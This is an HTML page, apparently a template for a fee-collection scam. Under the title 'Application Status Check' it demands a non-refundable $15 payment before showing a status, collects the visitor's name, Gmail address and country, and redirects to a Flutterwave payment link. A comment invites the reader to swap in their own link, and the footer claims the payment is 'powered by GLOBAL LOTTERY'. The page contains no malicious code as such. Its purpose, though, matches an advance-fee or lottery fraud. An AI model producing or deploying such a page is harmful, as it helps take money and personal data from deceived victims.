<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Status Check</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, sans-serif;
    }

    body{
      background:#f4f7fb;
      display:flex;
      justify-content:center;
      align-items:center;
      min-height:100vh;
      padding:20px;
    }

    .container{
      width:100%;
      max-width:450px;
      background:#fff;
      padding:30px;
      border-radius:15px;
      box-shadow:0 5px 20px rgba(0,0,0,0.1);
    }

    h2{
      text-align:center;
      margin-bottom:20px;
      color:#222;
    }

    .notice-box{
      background:#fff8e1;
      border:1px solid #ffd54f;
      padding:18px;
      border-radius:12px;
      margin-bottom:20px;
    }

    .notice-box p{
      color:#555;
      line-height:1.6;
      font-size:15px;
    }

    .checkbox-area{
      margin-top:15px;
      display:flex;
      align-items:flex-start;
      gap:10px;
    }

    .checkbox-area input{
      margin-top:4px;
    }

    .form-section{
      display:none;
    }

    .input-group{
      margin-bottom:18px;
    }

    label{
      display:block;
      margin-bottom:8px;
      font-weight:bold;
      color:#444;
    }

    input{
      width:100%;
      padding:14px;
      border:1px solid #ccc;
      border-radius:10px;
      font-size:16px;
      outline:none;
    }

    input:focus{
      border-color:#ff9800;
    }

    button{
      width:100%;
      padding:15px;
      border:none;
      background:#ff9800;
      color:#fff;
      font-size:17px;
      border-radius:10px;
      cursor:pointer;
      transition:0.3s;
      font-weight:bold;
    }

    button:hover{
      background:#e68900;
    }

    .note{
      margin-top:15px;
      text-align:center;
      font-size:14px;
      color:#777;
    }
  </style>
</head>
<body>

  <div class="container">

    <h2>Application Status Check</h2>

    <!-- Notification Section -->
    <div id="noticeSection">
      <div class="notice-box">
        <p>
          To check your application status, a non-refundable fee of 
          <strong>$15 USD</strong> is required.
          <br><br>
          By proceeding, you agree to make this payment before accessing your application status.
        </p>

        <div class="checkbox-area">
          <input type="checkbox" id="agreeCheck">
          <label for="agreeCheck">
            I understand and agree to pay $15 to continue.
          </label>
        </div>
      </div>

      <button onclick="continueForm()">
        Continue
      </button>
    </div>

    <!-- Form Section -->
    <div class="form-section" id="formSection">

      <form id="statusForm">

        <div class="input-group">
          <label>Full Name</label>
          <input type="text" id="fullname" placeholder="Enter full name" required>
        </div>

        <div class="input-group">
          <label>Gmail Address</label>
          <input type="email" id="email" placeholder="Enter Gmail address" required>
        </div>

        <div class="input-group">
          <label>Country</label>
          <input type="text" id="country" placeholder="Enter country" required>
        </div>

        <button type="submit">
          Proceed To Payment
        </button>

        <div class="note">
          Secure payment powered by GLOBAL LOTTERY
        </div>

      </form>
    </div>

  </div>

  <script>
    function continueForm() {
      const agree = document.getElementById("agreeCheck");

      if (!agree.checked) {
        alert("Please agree to the payment notice before continuing.");
        return;
      }

      document.getElementById("noticeSection").style.display = "none";
      document.getElementById("formSection").style.display = "block";
    }

    document.getElementById("statusForm").addEventListener("submit", function(e){
      e.preventDefault();

      const fullname = document.getElementById("fullname").value;
      const email = document.getElementById("email").value;
      const country = document.getElementById("country").value;

      // Save details temporarily
      localStorage.setItem("fullname", fullname);
      localStorage.setItem("email", email);
      localStorage.setItem("country", country);

      // Replace with your Flutterwave payment link
      const flutterwaveUrl = "https://flutterwave.com/pay/kqsgvbl9spjm";

      // Redirect to Flutterwave payment page
      window.location.href = flutterwaveUrl;
    });
  </script>

</body>
</html>
